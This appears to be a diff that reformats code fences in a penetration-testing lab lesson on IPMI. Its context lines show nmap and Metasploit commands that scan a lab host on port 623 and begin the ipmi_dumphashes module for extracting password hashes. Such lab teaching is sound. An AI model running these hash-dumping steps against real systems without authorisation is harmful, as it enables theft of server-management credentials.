@@ -26,8 +26,7 @@ IPMI communicates over port 623 UDP. Systems that use the IPMI protocol are call
 
 #### Nmap
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
 
 Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:48 GMT
@@ -51,8 +50,7 @@ Here, we can see that the IPMI protocol is indeed listening on port 623, and Nma
 
 #### Metasploit Version Scan
 
-```
-        shellsession
+```shellsession
 msf6 > use auxiliary/scanner/ipmi/ipmi_version 
 msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
 msf6 auxiliary(scanner/ipmi/ipmi_version) > show options 
@@ -96,8 +94,7 @@ To retrieve IPMI hashes, we can use the Metasploit [IPMI 2.0 RAKP Remote SHA1 Pa
 
 #### Metasploit Dumping Hashes
 
-```
-        shellsession
+```shellsession
 msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
 msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
 msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options 
